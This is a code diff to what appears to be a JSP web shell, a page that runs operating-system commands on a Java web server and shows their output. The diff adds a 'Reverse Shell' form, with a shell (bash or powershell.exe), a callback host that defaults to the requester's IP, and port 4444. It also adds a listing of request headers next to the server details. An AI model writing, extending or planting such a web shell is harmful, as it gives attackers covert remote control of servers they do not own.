@@ -152,6 +152,36 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 	}
 %>
 
+<hr />
+
+<h3>Reverse Shell</h3>
+
+<form action="" method="GET">
+<%
+	String providedShell = request.getParameter("shell");
+	
+	if(null == providedShell || providedShell.isEmpty()) {
+		if(System.getProperty("os.name").contains("Windows")) {
+			providedShell = "powershell.exe";
+		} else {
+			providedShell = "bash";
+		}
+	}
+	
+	String providedAddress = request.getParameter("address");
+	if(null == providedAddress || providedAddress.isEmpty()) {
+		providedAddress = request.getRemoteAddr();
+	}
+%>
+<label>Shell:</label><input type="text" name="shell" size="100" value="<%= clean(providedShell) %>"/><br />
+<label>Hostname or IP Address:</label><input type="text" name="address" size="100" value="<%= clean(providedAddress) %>"/><br />
+<label>Port:</label><input type="text" name="port" size="6" value="<%= 4444 %>"/><br />
+<br />
+<input type="submit" value="Connect" />
+</form>
+
+<hr />
+
 <h3>Command Output (STDOUT & STDERR)</h3>
 <pre>
 <%
@@ -182,15 +212,28 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 
 <hr />
 
+<pre>
+
 <h3>Server Information</h3>
 
-<pre>
 Server localtime:	<%= Calendar.getInstance().getTime() %>
 Server localtime in milliseconds:	<%= Calendar.getInstance().getTimeInMillis() %>
 (Epoch is January 1, 1970 00:00:00.000 GMT)
 Server localtime in seconds:	<%= Calendar.getInstance().getTimeInMillis() / 1000 %>
 
 Working directory:	<%= System.getProperty("user.dir") %>
+
+<hr />
+
+<h3>Request Headers</h3>
+
+<%
+	final Enumeration<String> headerNames = request.getHeaderNames();
+	while(headerNames.hasMoreElements()) {
+	  final String headerName = headerNames.nextElement();
+	  out.println(clean(headerName + "\t" + request.getHeader(headerName)));
+	}
+%>
 
 <hr />
 
